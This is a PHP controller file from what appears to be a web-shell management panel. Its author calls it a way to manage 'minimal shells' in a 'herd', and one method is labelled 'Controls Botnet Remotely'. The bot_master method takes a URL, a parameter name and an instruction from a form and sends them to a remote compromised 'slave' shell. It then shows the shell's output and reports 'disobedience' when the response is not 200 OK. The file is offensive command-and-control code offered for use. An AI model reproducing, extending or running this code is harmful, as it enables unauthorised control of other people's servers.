<?php
/**
 Purpose: Makes you a shepherd to manage your minimal shells quick and easy in a "herd"
    
    Copyright (c) 2015 ~ alienwithin
    Munir Njiru <munir@skilledsoft.com>
 
        @version 1.0.0
        @date: 30.06.2015
        @url : http://munir.skilledsoft.com
 **/
namespace Controller;
/**
 * Handles HTTP Bot Functions
 * Class Webot
 * @package Controller
 */
class Webot extends Resource {
    /**
     * Initialize Mapper and load appropriate model
     */

	public function __construct() {
		$mapper = new \Model\Webot();
		parent::__construct($mapper);
	}

	public function getSingle(\Base $f3, $params) {
		$this->response->data['SUBPART'] = 'webot_edit.html';
		if (isset($params['id'])) {
			$this->resource->load(array('_id = ?', $params['id']));
			if ($this->resource->dry())
				$f3->error(404, 'Payload not found');
			$this->response->data['POST'] = $this->resource;
		}
	}
	
//The \Base is for \Base:instance from f3 base class not our abstract class
    /**
     * @param \Base $f3
     * @param array $param
     */
	public function getList(\Base $f3,$param) {
		$this->response->data['SUBPART'] = 'webot_list.html';
		$page = \Pagination::findCurrentPage();
		if ($this->response instanceof \View\Backend) {
			// backend view
		$records = $this->resource->paginate($page-1,10,null,
				array('order'=>'id desc'));
		} else {
			// frontend view
			
			$records = $this->resource->paginate($page-1,10,null,
				array('order'=>'id desc'));
		}
		$this->response->data['content'] = $records;
	}

    /**
     * @param \Base $f3
     * @param array $params
     */
	public function post(\Base $f3, $params) {
		$this->response->data['SUBPART'] = 'webot_edit.html';
		$msg = \Flash::instance();
		if (isset($params['id'])) {
			// update existing
			$this->resource->load(array('_id = ?', $params['id']));
	}
		parent::post($f3,$params);
	}

    /**
     * @param \Base $f3
     * @param array $params
     */
	public function viewSingle(\Base $f3, $params) {
		$web=\Web::instance();
		$this->response->data['SUBPART'] = 'webot_control.html';
		if (isset($params['id'])) {
			$this->resource->load(array('_id = ?', $params['id']));
			$this->response->data['POST'] = $this->resource;
			if ($this->resource->dry()){
				$f3->error(404, 'Webot not found');
			}
			else{
				
				$this->response->data['SUBPART'] = 'webot_control.html';
				
				$url=$f3->get('POST.zLoc');
				$command_key=$f3->get('POST.zParam');
				$instruction=$f3->get('POST.instruction');
				
				return $this->bot_master( $url, $command_key, $instruction);
			}	
			}
			
		
	}

    /**
     * Controls Botnet Remotely
     * @param $url
     * @param $command_key
     * @param $instruction
     */
	private function bot_master( $url, $command_key, $instruction){
		$web=\Web::instance();
		$f3=\Base::instance();
		
		if($f3->get('VERB') == 'POST') {
			$error = false;		
					
					$params = array(
					    $command_key => $instruction
					);
					$options = array('method' => 'GET');
					$url .= '?'.http_build_query($params);
					$request_successful=$web->request($url,$options);
					 if (!($request_successful)){
				    	\Flash::instance()->addMessage('The Request was unsuccessful check whether slave exists','warning');
					}
					else{
							$result_body=$request_successful['body'];
					    	$result_headers=$request_successful['headers'];
					    	$response_header=$result_headers["0"];
					    	$engine=$request_successful['engine'];
					    	$headers_max=implode("\n",$result_headers);
						if (strpos($response_header,'200 OK') !== false) {
						  	
							//$myFinalRequest="Headers: \n\n".$headers_max."\n\n Body:\n\n".$result_body."\n\n Engine Used: ".$engine;
							$this->response->data['content']=$result_body;
						}
						else {
							$this->response->data['content']= "Slave seems to have developed disobedience it said: \n\n ".$headers_max;
						}
						//convert array header to string
						
					}
					
			
			
				
			
		}
	}

    /**
     * @param $f3
     */
	public function getSearchResults($f3) {
	  $this->response->data['SUBPART'] = 'webot_list.html';
	  $page = \Pagination::findCurrentPage();
	  
	  $term=$f3->get('GET.term');
	  $search_filter = array('zName LIKE ? zParam LIKE ? ',"%$term%","%$term%");
	  
	  $records = $this->resource->paginate($page-1,10,
      $search_filter,	array('order' => 'id desc'));
	  
	
	  $this->response->data['content'] = $records;
	}

    /**
     * @param \Base $f3
     * @param array $params
     */
	public function delete(\Base $f3, $params) {
		$this->resource->reset();
		$msg = \Flash::instance();
		if (isset($params['id'])) {
			$this->resource->load(array('_id = ?', $params['id']));
			
			parent::delete($f3,$params);
		}
		$f3->reroute($f3->get('SESSION.LastPageURL'));
	}

}
